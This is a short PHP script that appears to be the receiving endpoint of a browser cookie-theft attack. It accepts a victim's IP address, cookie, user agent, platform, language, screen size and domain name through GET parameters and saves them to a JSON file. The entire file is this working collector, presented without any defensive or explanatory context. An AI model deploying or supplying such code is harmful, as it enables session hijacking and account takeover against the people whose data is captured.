<?php
header('Content-Type: text/html');
error_log("Received" . "\r\n", 3, "Log.log");
{
  $ip = $_GET['ip'];
  $cookie = $_GET['cookie'];
  $ua = $_GET['ua'];
  $platf = $_GET['platf'];
  $lang = $_GET['lang'];
  $wid = $_GET['wid'];
  $hig = $_GET['hig'];
  $dname = $_GET['dname'];

  $data['info'] = array();

  $data['info'][] = array(
    'ip' => $ip,
    'cookie' => $cookie,
    'ua' => $ua,
    'platf' => $platf,
    'lang' => $lang,
    'wid' => $wid,
    'hig' => $hig,
    'dname' => $dname);

  $jdata = json_encode($data);

  $f = fopen('data.json', 'w+');
  fwrite($f, $jdata);
  fclose($f);
}
?>
